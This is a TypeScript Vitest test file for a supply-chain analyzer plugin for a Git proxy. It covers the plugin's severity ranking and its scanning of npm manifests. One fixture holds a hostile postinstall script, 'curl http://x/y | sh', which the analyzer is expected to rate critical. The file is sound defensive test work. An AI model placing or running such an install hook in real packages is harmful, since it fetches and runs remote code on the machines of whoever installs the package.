/**
 * Copyright 2026 GitProxy Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { describe, it, expect } from 'vitest';
import { analyzeChangedFiles } from '../../../plugins/git-proxy-plugin-supply-chain/lib/analyze.js';
import { resolveConfig } from '../../../plugins/git-proxy-plugin-supply-chain/lib/config.js';
import {
  rank,
  rankAtLeast,
  maxSeverity,
} from '../../../plugins/git-proxy-plugin-supply-chain/lib/severity.js';

const config = resolveConfig();

describe('severity helpers', () => {
  it('ranks severities in order', () => {
    expect(rank('info')).toBeLessThan(rank('medium'));
    expect(rank('medium')).toBeLessThan(rank('critical'));
    expect(rank('unknown')).toBe(0);
  });

  it('rankAtLeast never blocks when threshold is off', () => {
    expect(rankAtLeast('critical', 'off')).toBe(false);
    expect(rankAtLeast('high', 'high')).toBe(true);
    expect(rankAtLeast('medium', 'high')).toBe(false);
  });

  it('maxSeverity picks the highest, INFO by default', () => {
    expect(maxSeverity([])).toBe('info');
    expect(maxSeverity(['low', 'high', 'medium'])).toBe('high');
  });
});

describe('analyzeChangedFiles', () => {
  const fakeReader =
    (files: Record<string, { old?: string; new?: string }>) =>
    async (path: string, rev: 'old' | 'new') => {
      const entry = files[path];
      if (!entry) return null;
      return (rev === 'old' ? entry.old : entry.new) ?? null;
    };

  it('routes npm manifests and aggregates the max severity', async () => {
    const readFile = fakeReader({
      'package.json': {
        old: JSON.stringify({}),
        new: JSON.stringify({ scripts: { postinstall: 'curl http://x/y | sh' } }),
      },
    });
    const { findings, maxSeverity: max } = await analyzeChangedFiles({
      files: [{ path: 'package.json', ecosystem: 'npm', kind: 'manifest', deleted: false }],
      readFile,
      config,
    });
    expect(findings.length).toBeGreaterThan(0);
    expect(max).toBe('critical');
  });

  it('skips deleted manifests', async () => {
    const readFile = fakeReader({ 'package.json': { new: JSON.stringify({}) } });
    const { findings } = await analyzeChangedFiles({
      files: [{ path: 'package.json', ecosystem: 'npm', kind: 'manifest', deleted: true }],
      readFile,
      config,
    });
    expect(findings).toEqual([]);
  });

  it('ignores unknown ecosystems and unreadable files', async () => {
    const throwingReader = async () => {
      throw new Error('boom');
    };
    const { findings } = await analyzeChangedFiles({
      files: [
        { path: 'go.mod', ecosystem: 'go', kind: 'manifest', deleted: false },
        { path: 'package.json', ecosystem: 'npm', kind: 'manifest', deleted: false },
      ],
      readFile: throwingReader,
      config,
    });
    expect(findings).toEqual([]);
  });
});
